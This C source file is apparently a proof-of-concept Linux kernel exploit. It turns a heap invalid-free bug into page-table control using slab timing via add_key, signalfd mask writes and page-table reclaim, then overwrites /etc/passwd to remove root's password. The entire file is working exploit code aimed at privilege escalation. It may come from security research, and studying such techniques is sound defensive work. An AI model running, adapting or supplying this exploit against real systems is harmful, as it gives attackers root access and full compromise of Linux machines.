#define _POSIX_SOURCE
#include "uhelper.h"
#include "pgtable.h"
#include "cacheutils.h"
#include "my_keyutils.h"
#include <setjmp.h>
#include <pthread.h>
#include <sys/timerfd.h>
#include <time.h>
#include <sys/signalfd.h>

/**
 * Constants
 */
#define PMD_SIZE (1ULL << 21)
#define PUD_SIZE (1ULL << 30)
#define PGD_SIZE (1ULL << 39)
#define PAGE_SIZE (1ULL << 12)

/**
 * Vulnerable kernel driver for the kernel heap vulnerability
 */
#include "slab_settings.h"
#include "alloc_primitives.h"

/**
 * Interacting functions with the kernel
 * this POC uses the allocation of our module
 * instead we can also use the anon_vma_name object
 * we can allocate ((0x7f-0x1f)-5)^3 anon_vma_name by considering all allowed characters (i.e., is_valid_name_char)
 */
#define ALLOC_VULN() do { int ret = alloc_obj((1 << 18) - 1, cur->size, 0); if (ret) pr_error("alloc vuln error\n"); } while (0)
#define FREE_VULN() do { int ret = free_obj((1 << 18) - 1); if (ret) pr_error("free vuln error\n"); } while (0)
#define YIELD(i) do { for (size_t _i = 0; _i < i; ++_i) sched_yield(); } while (0)
#define THRESHOLD -800

size_t objs[100000];
void alloc_pci_obj(size_t i)
{
    int fd = open("/proc/bus/pci/00/00.0", O_RDONLY);
    if (fd < 0)
        pr_perror("open(/proc/bus/pci/00/00.0)");
    objs[i] = fd;
}
void free_pci_obj(size_t i)
{
    close(objs[i]);
}

void mmap_warmup(void)
{
    char *data;
    pr_info("alloc virtual memory\n");

    data = mmap(0, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); 
    if (data == MAP_FAILED)
        pr_perror("mmap");
}

static size_t *start_indexes;

void alloc_objs(void)
{
    pr_info("allocate %ld objs\n", cur->allocs);
    for (size_t i = 0; i < cur->allocs; ++i)
        alloc_pci_obj(i);
}

enum state {
    INIT = 0,
    INVALID_FREE,
    ALLOC_CONTD,
    WRITE,
    PAGE_TABLE_ACCESS,
};
volatile enum state state = INIT;
volatile int fd_signal;
volatile sigset_t mask;
void *handle_mwp(void *)
{
    int ret;
    size_t *buf;
    size_t pte = PTE;

    pin_to_core(0);
    buf = (size_t *)malloc(cur->size);
    for (size_t i = 0; i < cur->size/sizeof(size_t); ++i)
        buf[i] = pte;

    pr_info("wait to alloc timerfd\n");
    while (state != INVALID_FREE)
        sched_yield();

    /* create dangling pointer which are randoms pt entries */
    FREE_VULN();
    /* alloc persistent object signalctx */
    fd_signal = signalfd(-1, (const sigset_t *)&mask, 0);
    if (fd_signal < 0)
        pr_perror("signalfd alloc");
    pr_info("pte should be %016zx\n", pte);
    for (size_t i = 0; i < _SIGSET_NWORDS; ++i)
        mask.__val[i] = ((size_t)-1 ^ pte);
    pr_info("allocated signalfd -> wait for write\n");

    state = ALLOC_CONTD;
    while (state != WRITE)
        sched_yield();
    pr_info("overwrite pt\n");

    /* overwrite one pmd entry to reference to physical page zero */
    ret = signalfd(fd_signal, (const sigset_t *)&mask, 0);
    if (ret < 0)
        pr_perror("signalfd set");

    state = PAGE_TABLE_ACCESS;
    pr_info("done MWP\n");

    return 0;
}

void timed_alloc_objs(void)
{
    int ret;
    pthread_t tid;

    size_t t0;
    size_t t1;
    ssize_t time = 0;
    ssize_t prev_time = 0;
    ssize_t derived_time = 0;
    ssize_t start = -1;
    size_t running = 0;
    char *value;

    /* create key value which causes the kernel to return with an error (fast) */
    value = malloc(cur->size);
    memset(value, 0x41, cur->size);
    value[0] = '.';
    value[cur->size - 1] = 0;
    *(volatile char *)keyring;

    ret = pthread_create(&tid, 0, handle_mwp, 0);
    if (ret < 0)
        pr_perror("pthread_create handle mwp");
    usleep(500000);

    pr_info("allocate %ld objs\n", cur->allocs);
    for (size_t i = 0; i < cur->allocs; ++i) {
        if (running == cur->reclaimed_page_table && i - start == (cur->obj_per_slab - 3)) {
            /* failed -> need to be restarted */
            if (state == ALLOC_CONTD)
                break;
            ALLOC_VULN();
        }
        sched_yield();
        alloc_pci_obj(i);
        /*
            exploit_signal.-2830    [000] .....   161.818564: kmem_cache_free: call_site=close_pdeo+0x115/0x130 ptr=00000000d15e65b9 name=pde_opener
            exploit_signal.-2830    [000] .....   161.818564: kmem_cache_free: call_site=security_file_free+0x54/0x70 ptr=00000000e1e06e9e name=lsm_file_cache
            exploit_signal.-2830    [000] .....   161.818565: kfree: call_site=proc_bus_pci_release+0x19/0x40 ptr=00000000b3a6a94a
            prevent close_pdeo and security_file_free to corrupt the per cpu page free list
        */
        ret = open("/proc/tty/drivers", O_RDONLY);
        if (ret < 0)
            pr_perror("open(/proc/tty/drivers)");
        t0 = rdtsc_begin();
        ret = add_key(keyring, value, 0, 0, KEY_SPEC_THREAD_KEYRING);
        t1 = rdtsc_end();
        if (ret >= 0)
            pr_perror("add_key should be an error");
        prev_time = time;
        time = t1 - t0;
        if (i > cur->allocs/16) {
            derived_time = time - prev_time;
            if (start == -1) {
                if (derived_time < THRESHOLD) {
                    start = i;
                    continue;
                }
            } else if (i - start == cur->obj_per_slab) {
                if (derived_time < THRESHOLD) {
                    start_indexes[running] = start;
                    running++;
                    if (running == cur->slab_per_chunk)
                        break;
                    start = i;
                } else {
                    start = i;
                    running = 0;
                }
            }
            if (running == cur->reclaimed_page_table && i - start == (cur->obj_per_slab - 3)) {
                /* handle fuse with timed read */
                pr_info("set handle fuse ready\n");
                state = INVALID_FREE;
                while (state != ALLOC_CONTD)
                    sched_yield();
                FREE_VULN();
            }
        }
    }
    if (running != cur->slab_per_chunk)
        pr_error("RETRY (start not found)\n");
    for (size_t i = 0; i < cur->slab_per_chunk; ++i)
        pr_debug("start %ld\n", start_indexes[i]);
}

#define DATA_START 0xd0000000000
static void *data;
void free_objs_and_alloc_mmap(void)
{
    /* alloc for everything except pt mapping */
    data = mmap((void *)0xd0000000000, PAGE_SIZE*8, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (data == MAP_FAILED)
        pr_perror("mmap");
    /* alloc and map pud */
    memset(data, 0x42, PAGE_SIZE);
    data = mmap((void *)(0xd0000000000 + PMD_SIZE), PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (data == MAP_FAILED)
        pr_perror("mmap");

    pr_info("empty caches and free objs slab per chunk %ld obj per slab %ld\n", cur->slab_per_chunk, cur->obj_per_slab);
    free_pci_obj(start_indexes[0] - 3);
    free_pci_obj(start_indexes[0] - 2);
    free_pci_obj(start_indexes[0] - 1);
    for (size_t i = 0; i < cur->slab_per_chunk; ++i) {
        for (ssize_t j = 0; j < (ssize_t)cur->obj_per_slab; ++j) {
            free_pci_obj(start_indexes[i] + j);
        }
    }
    /* map pmd and pt */
    memset(data, 0x42, PAGE_SIZE);
    memset(data, 0x42, PAGE_SIZE);
    memset(data, 0x42, PAGE_SIZE);
    memset(data, 0x42, PAGE_SIZE);
    memset(data, 0x42, PAGE_SIZE);
    memset(data, 0x42, PAGE_SIZE);
    memset(data, 0x42, PAGE_SIZE);
    memset(data, 0x42, PAGE_SIZE);
}

static char *current_addr;
static char buf[PAGE_SIZE];
static sigjmp_buf jmp;
static void signal_handler(int signal, siginfo_t *, void *)
{
    if (signal == SIGSEGV) {
        current_addr += PAGE_SIZE;
        siglongjmp(jmp, 1);
    }
}

void setup_signal_handler(void)
{
    struct sigaction handler;
    handler.sa_sigaction = signal_handler;
    handler.sa_flags = SA_SIGINFO | SA_NODEFER | SA_ONSTACK;
    sigemptyset(&handler.sa_mask);
    int ret = sigaction(SIGSEGV, &handler, 0);
    if (ret)
        pr_perror("sigaction");
}

void find_pt(void)
{
    int found = 0;
    state = WRITE;
    while (state != PAGE_TABLE_ACCESS)
        sched_yield();
    pr_info("continue check pt\n");
    // print_pagetable_walk((size_t)data);

    stack_t sigstk;
    sigstk.ss_sp = malloc(SIGSTKSZ);
    sigstk.ss_size = SIGSTKSZ;
    sigstk.ss_flags = 0;
    sigaltstack(&sigstk, 0);
    setup_signal_handler();

    /**
     * find virt addr for corrupted pte
     */
    memset(buf, 0x42, PAGE_SIZE);
    current_addr = data;
    sigsetjmp(jmp, 0);
    
    while ((size_t)current_addr < ((size_t)data + PMD_SIZE)) {
        if (memcmp(current_addr, buf, PAGE_SIZE)) {
            found = 1;
            break;
        }
        current_addr += PAGE_SIZE;
    }
    
    if (!found)
        pr_error("reclaiming as pt did not work\n");
    pr_info("found virt addr %016zx\n", (size_t)current_addr);
    // print_pagetable_walk((size_t)current_addr);
}

#define ARRAY_SZ (1 << 26)
char *large_array;
static size_t old_pt;
static size_t *arb_pt = (size_t *)-1;
static char *arb_page = (char *)-1;
#define MMAP_SIZE PUD_SIZE*4
void overwrite_ptes(void)
{
    int ret;
    char buf[PAGE_SIZE];
    char *ptr = mmap((void *)(1ULL << 46), MMAP_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
    if (ptr == MAP_FAILED)
        pr_perror("mmap");
    // size_t mapping_space = cur->size/8*PUD_SIZE;
    size_t mapping_space = PUD_SIZE; /* for a speed up */

    large_array = mmap(0, ARRAY_SZ, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, -1, 0);
    if (large_array == MAP_FAILED)
        pr_perror("mmap");

    pr_info("init pt already mapped\n");
    size_t pts_mapped = 0;
    char *pt_already_mapped = malloc(mapping_space/PAGE_SIZE);
    memset(pt_already_mapped, 0, mapping_space/PAGE_SIZE);
    for (size_t i = 0; i < mapping_space/PAGE_SIZE; ++i) {

        for (size_t j = 0; j < _SIGSET_NWORDS; ++j)
            mask.__val[j] = ((size_t)-1 ^ (PTE | i*PAGE_SIZE | (1ULL << 32)));
        /* overwrite pte */
        ret = signalfd(fd_signal, (const sigset_t *)&mask, 0);
        if (ret < 0)
            pr_perror("signalfd set");
        /* fastest way for this case to flush the tlb */
        for (size_t j = 0; j < ARRAY_SZ; j += PAGE_SIZE)
            *(volatile char *)(large_array + j);
        syscall(-1);

        if ((*(size_t *)current_addr & PTE) == PTE) {
            pts_mapped += 1;
            pt_already_mapped[i] = 1;
        }
    }

    pr_info("%zd page tables are mapped\n", pts_mapped);

    pr_info("map a lot of page tables\n");
    for (size_t i = 0; i < MMAP_SIZE; i += PMD_SIZE)
        memset(ptr + i, 0x46, PAGE_SIZE);

    memset(buf, 0x46, PAGE_SIZE);
    pr_info("show where new page tables are\n");
    for (size_t i = 0; i < mapping_space/PAGE_SIZE; ++i) {

        for (size_t j = 0; j < _SIGSET_NWORDS; ++j)
            mask.__val[j] = ((size_t)-1 ^ (PTE | i*PAGE_SIZE | (1ULL << 32)));
        /* overwrite pte */
        ret = signalfd(fd_signal, (const sigset_t *)&mask, 0);
        if (ret < 0)
            pr_perror("signalfd set");
        /* fastest way for this case to flush the tlb */
        for (size_t j = 0; j < ARRAY_SZ; j += PAGE_SIZE)
            *(volatile char *)(large_array + j);
        syscall(-1);
        // hex_dump((size_t *)current_addr, 1);

        if ((*(size_t *)current_addr & PTE) == PTE &&
            (*(size_t *)current_addr >> 48) == 0x8000 &&
            pt_already_mapped[i] == 0) {
            pr_info("found pt at %ld with %016zx\n", i, *(size_t *)current_addr);
            arb_pt = (size_t *)current_addr;
            old_pt = *arb_pt;
            *arb_pt = PTE;
            for (size_t i = 0; i < MMAP_SIZE; i += PMD_SIZE) {
                if (memcmp(ptr + i, buf, PAGE_SIZE)) {
                    arb_page = ptr + i;
                    pr_info("found page %016zx\n", (size_t)arb_page);
                    break;
                }
            }
            if (arb_page != (char *)-1)
                break;
            *arb_pt = old_pt;
        }
    }
    if (arb_pt == (size_t *)-1)
        pr_error("arbitrary page table not found\n");
    if (arb_page == (char *)-1)
        pr_error("arbitrary page not found\n");
}

void overwrite_etc_passwd(void)
{
    char buf[PAGE_SIZE];
    int fd_passwd = open("/etc/passwd", O_RDONLY);
    if (fd_passwd < 0)
        pr_perror("open(/etc/passwd)");
    memcpy(buf, "AAAA", 4);
    int ret = read(fd_passwd, buf+4, PAGE_SIZE-4);
    if (ret < 0)
        pr_perror("read");
    void *ptr = current_addr;
    volatile size_t *etc_passwd = (size_t *)arb_page;
    char *char_sequ = buf + 4;
    char overwrite_char_sequ[] = "root::00:0:root:/root";
    size_t overwrite_instr_sequ = *(size_t*)overwrite_char_sequ;

    for (size_t i = 0; i < 16ULL * PUD_SIZE; i += PAGE_SIZE) {
        if (i % (PUD_SIZE/8) == 0) {
            pr_info("%3zu/%3d\n", (size_t)(i/(PUD_SIZE/8)), 16*8);
            // print_pagetable_walk((size_t)etc_passwd);
        }
        *arb_pt = PTE | i;
        /* flush tlb */
        syscall(-1);
        /* root:x:0:0:root:/root -> root::00:0:root:/root */
        if (*etc_passwd == *(size_t *)char_sequ && *(etc_passwd+1) == *(size_t *)(char_sequ + 8) && *(etc_passwd+2) == *(size_t *)(char_sequ + 16) && *(etc_passwd+3) == *(size_t *)(char_sequ + 24)) {
            *etc_passwd = overwrite_instr_sequ;
            pr_info("/etc/passwd found at phys %016zx\n", i);
            break;
        }
        ptr += PAGE_SIZE;
    }
    *arb_pt = old_pt;
}

/**
 * main function
 */
int main(void)
{
    size_t slab_size = 8;

    pr("start\n");
    helper_init();
    set_current_slab_info(slab_size);
    start_indexes = malloc(sizeof(size_t)*cur->slab_per_chunk);

    pr("allocate free pages as warmup\n");
    mmap_warmup();

    // PRINT_INFO=0;
    // PRINT_DEBUG=0;
    pr("alloc\n");
    alloc_objs();
    timed_alloc_objs();
    // system("echo 1 > /sys/kernel/debug/tracing/events/kmem/kmalloc/enable");
    // system("echo 1 > /sys/kernel/debug/tracing/events/kmem/kfree/enable");
    // system("echo 1 > /sys/kernel/debug/tracing/events/kmem/kmem_cache_free/enable");

    // pr("free slab page\n");
    free_objs_and_alloc_mmap();
    // system("echo 0 > /sys/kernel/debug/tracing/events/kmem/kmalloc/enable");
    // system("echo 0 > /sys/kernel/debug/tracing/events/kmem/kfree/enable");
    // system("echo 0 > /sys/kernel/debug/tracing/events/kmem/kmem_cache_free/enable");

    pr("check whether we reclaimed the memory chunk as pt\n");
    find_pt();

    pr("tamper page table entries\n");
    overwrite_ptes();
    pr("tamper /etc/passwd\n");
    overwrite_etc_passwd();

    pr("done\n");
}